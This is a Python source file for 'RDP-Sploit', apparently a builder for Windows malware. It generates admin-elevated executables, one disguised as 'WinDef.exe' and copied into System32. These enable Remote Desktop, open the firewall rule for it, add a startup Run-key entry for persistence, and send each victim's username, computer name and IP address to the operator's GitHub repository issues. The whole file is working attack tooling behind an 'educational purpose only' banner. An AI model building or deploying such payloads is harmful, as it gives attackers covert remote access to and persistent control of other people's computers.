# Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N)
# Star the repo at (https://github.com/D4RKH0R1Z0N/rdp-sploit) Made in Python

import os
import shutil
from time import sleep
from sys import exit as closeprogram
from sys import platform

username = os.getlogin()
desk_path = "C:/Users/" + username + "/Desktop"

def tool_path_c():
    tool_path = desk_path + "/rdp-sploit"

    if os.path.exists(tool_path) and os.path.isdir(tool_path):
        shutil.rmtree(tool_path)

    os.chdir(desk_path)
    os.mkdir("rdp-sploit")
    os.chdir(tool_path)
    os.mkdir("client")
    tool_path = desk_path + "/rdp-sploit/client"
    os.chdir(tool_path)

def del_build_data():
    dist_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/dist"
    home_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/"
    build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/build"
    if os.path.exists(build_path) and os.path.isdir(build_path):
        shutil.rmtree(build_path)
    build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/__pycache__"
    if os.path.exists(build_path) and os.path.isdir(build_path):
        shutil.rmtree(build_path)
    os.remove("client.spec")
    os.remove("WinDef.spec")
    dst_1 = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/client.exe"
    dst_2 = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/WinDef.exe"
    os.chdir(dist_path)
    os.rename("client.exe", dst_1)
    os.rename("WinDef.exe", dst_2)
    os.chdir(home_path)
    build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/dist"
    if os.path.exists(build_path) and os.path.isdir(build_path):
        shutil.rmtree(build_path)

if platform == "win32":
    print("WARNING : THIS SCRIPT IS MADE FOR EDUCATIONAL PURPOSE ONLY")
    print("")
    print("YOU HAVE BEEN WARNED!")
    sleep(2)
    os.system("cls")

    print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
    print("This is the Info Format (Username - Computer_Name - IP_Address)")

    file_loc = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/"
    
    def create_payload():
        tool_path_c()
        access_token = input("Please Enter Your GitHub Token : ")
        username = input("Please Enter Your GitHub Username : ")
        repo_name = input("Please Enter Your Repo Name : ")
        print("")
        print("Please Wait Creating Payload...")
        client_file = open("client.py", "w")
        payload_data = """from socket import gethostname, gethostbyname
from requests import post
from json import dump as dump_data
from os import getlogin, system, getcwd
from os import chdir as goto
from os import rename as copy

goto("C:/Windows/System32")

system(""" + '"""' + """reg add """ + '"' + "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" + '"' + """ /v fDenyTSConnections /t REG_DWORD /d 0 /f""" + '"""' + """)
system(""" + '"""' + """netsh advfirewall firewall set rule group=""" + '"' + "remote desktop" + '"' + """ new enable=Yes""" + '"""' + """)
system(""" + '"""' + """ reg add """ + '"' + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" + '"' + """ /t REG_SZ /d""" + '"' + "C:/Windows/System32/WinDef.exe" + '"' + ' ' + '"""' + """)

dir = getcwd()
file_name = "\\WinDef.exe"
file_path = dir + file_name
sys_path = "C:/Windows/System32"
file_sys_path = sys_path + file_name
copy(file_path, file_sys_path)

token = """ + '"' + access_token + '"' +"""
pc_name = gethostname()
client_ip = gethostbyname(pc_name)
nickname = getlogin()
headers = {"Authorization" : "token {}".format(token)}
info = {"title": nickname + " - " + pc_name + " - " + client_ip}
username = """ + '"' + username + '"' + """
Repositoryname = """  + '"' + repo_name  + '"' + """
url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)
post(url,data=dump_data(info),headers=headers)"""
        startup_payload = """from socket import gethostname, gethostbyname
from requests import post
from json import dump as dump_data
from os import getlogin, system

system(""" + '"""' + """reg add """ + '"' + "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" + '"' + """ /v fDenyTSConnections /t REG_DWORD /d 0 /f""" + '"""' + """)
system(""" + '"""' + """netsh advfirewall firewall set rule group=""" + '"' + "remote desktop" + '"' + """ new enable=Yes""" + '"""' + """)
system(""" + '"""' + """ reg add """ + '"' + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" + '"' + """ /t REG_SZ /d""" + '"' + "C:/Windows/System32/WinDef.exe" + '"' + ' ' + '"""' + """)

token = """ + '"' + access_token + '"' +"""
pc_name = gethostname()
client_ip = gethostbyname(pc_name)
nickname = getlogin()
headers = {"Authorization" : "token {}".format(token)}
info = {"title": nickname + " - " + pc_name + " - " + client_ip}
username = """ + '"' + username + '"' + """
Repositoryname = """  + '"' + repo_name  + '"' + """
url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)
post(url,data=dump_data(info),headers=headers)"""

        print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
        print("This is the Info Format (Username - Computer_Name - IP_Address)")

        client_file.write(payload_data)
        client_file.close
        client_file_2 = open("WinDef.py", "w")
        client_file_2.write(startup_payload)
        client_file_2.close
        os.system("cls")
        print("Done... Converting...")
        sleep(0.8)
        os.system("""pyinstaller --noconfirm --onefile --windowed --uac-admin "client.py" """)
        os.system("""pyinstaller --noconfirm --onefile --windowed --uac-admin "WinDef.py" """)
        os.system("cls")
        print("Cleaning Up and Fixing Files...")
        del_build_data()
        os.chdir(desk_path)
        print("File's saved at : " + file_loc)

    brand = """
             _                       _       _ _
     _ __ __| |_ __        ___ _ __ | | ___ (_| |_
    | '__/ _` | '_ \ _____/ __| '_ \| |/ _ \| | __|
    | | | (_| | |_) |_____\__ | |_) | | (_) | | |_
    |_|  \__,_| .__/      |___| .__/|_|\___/|_|\__|
              |_|             |_|
    """

    def banner():
        print(brand)
        print("")
        print("Your Using RDP-Sploit v1.0")
        print("Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/)")
        print("")
        print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
        print("This is the Info Format (Username - Computer_Name - IP_Address)")

    def main_menu():
        print("")
        print("help - Show help menu")
        print("payload / create - Create Payload")
        print("clear - clear's the console")
        print("exit - exit the application")
        print("")
        input_1 = input("(RDP-Sploit)> ")
        if input_1 == "credits":
            print("")
            print("Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/)")
            main_menu()
        elif input_1 == "create" or input_1 == "payload":
            create_payload()
            main_menu()
        elif input_1 == "clear":
            os.system("cls")
            main_menu()
        elif input_1 == "help":
            print("")
            print("help - Show help menu")
            print("payload / create - Create Payload")
            print("clear - clear's the console")
            print("exit - exit the application")
            print("")
            print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
            print("This is the Info Format (Username - Computer_Name - IP_Address)")
            print("")
            main_menu()
        elif input_1 == "exit":
            os.system("cls")
            banner()
            print("")
            print("Bye Bye! Meet you Soon Again! :)")
            closeprogram()
        else:
            print("Please enter a Correct command from below!")
            print("")
            print("help - Show help menu")
            print("payload / create - Create Payload")
            print("clear - clear's the console")
            print("exit - exit the application")
            print("")
            print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
            print("This is the Info Format (Username - Computer_Name - IP_Address)")
            print("")
            main_menu()

    def start():
        banner()
        main_menu()

    start()
else:
    print("Please run this in Windows!")